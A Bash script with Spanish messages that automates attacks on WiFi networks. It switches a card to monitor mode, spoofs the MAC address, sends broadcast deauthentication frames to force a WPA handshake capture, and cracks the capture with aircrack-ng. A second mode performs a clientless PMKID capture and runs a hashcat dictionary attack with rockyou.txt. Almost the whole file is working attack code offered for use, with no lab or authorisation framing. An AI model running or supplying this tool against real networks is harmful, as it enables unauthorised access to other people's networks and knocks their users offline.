

#!/bin/bash

#colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColur="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
    echo "saliendo"

    tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
    rm Captura* 2>/dev/null
  exit 0

}


function helpPanel(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./popi.sh${endColour}"
	echo -e "\t${purpleColour}-a${endColour}${yellowColour} Modo de ataque${endColour}"
	echo -e "\t\t${redColour}handshake${endColour}"
	echo -e "\t\t${redColour}pkmid${endColour}"
	echo -e "\t${purpleColour}-n${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}\n"
	echo -e "\t${purpleColour}-h${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}\n"
	exit 0
}

function dependencies(){
	tput civis
	clear;	dependencies=(aircrack-ng macchanger)
	
	echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando dependencias...${endColour}"
	sleep 2

	for program in "${dependencies[@]}"; do
		echo -e "\n${yellowColour}[*]${endColour}${blueColour} Herramienta\t${endColour}${purpleColour}$program${endColour}\n"
	
		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ]; then
			echo -e " ${greenColour}(V)${endColour}"
		else
			echo -e " ${redColour}(X)${endColour}"
			echo -e "${yellowColour}[*]${endColour} Instalando herramienta ${blueColour}$program${endColour}"
			apt install $program -y > /dev/null 2>&1
		fi; sleep 1
	done
}


function startAttack(){
		clear
		echo -e "${yellowColour}[*]${endColour} Configurando tarjeta de red en modo monitor\n"
		airmon-ng start $networkCard > /dev/null 2>&1
		ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
		ifconfig ${networkCard}mon up;	killall dhclient wpa_supplicant 2>/dev/null

		echo -e "\n${yellowColour}[*]${endColour} Nueva direccion MAC asignada (${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour})" 
	
	if [ "$(echo $attack_mode)" == "handshake" ]; then
		xterm -hold -e "airodump-ng ${networkCard}mon" &
		airodump_xterm_PID=$!
		echo -ne "\n${yellowColour}[*]${endColour} Nombre del punto de acceso: " && read apName
		echo -ne "\n${yellowColour}[*]${endColour} Canal del punto de acceso: " && read apChannel
		kill -9 $airodump_xterm_PID
		wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &
		airodump_filter_xterm_PID=$!
		
		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null	
		
		sleep 10; kill -9 $airodump_filter_xterm_PID
		wait $airodump_filter_xterm_PID 2>/dev/null
		
		xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &

	elif [ "$(echo $attack_mode)" == "pkmid" ]; then
		clear; echo -e "${yellowColour}[*]${endColour} iniciando clientless PKMID attackkk--- \n"
		timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
		echo -e "\n\n${yellowColour}[*]${endColour} obteniendo hashes...\n"
		sleep 2
		hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
		
		test -f myHashes
		
		if [ "$(echo $?)" == "0" ]; then
			echo -e "\n${yellowColour}[*]${endColour} iniciando procesito de fuerza bruta \n"
			sleep 2		

			hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
		else
			echo -e "\n${redColor}[!] no se pudo capturar pakete{endColour}\n"
			sleep 2
		fi
	else
		echo -e "\n${redColour}[*] parámetro inválido para opción '-a'${endColour}\n "
	fi
}

# main
if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
		case $arg in
			a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
			n) networkCard=$OPTARG; let parameter_counter+=1 ;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		dependencies
		startAttack
		tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
	fi
else
	echo  "no es root"
fi

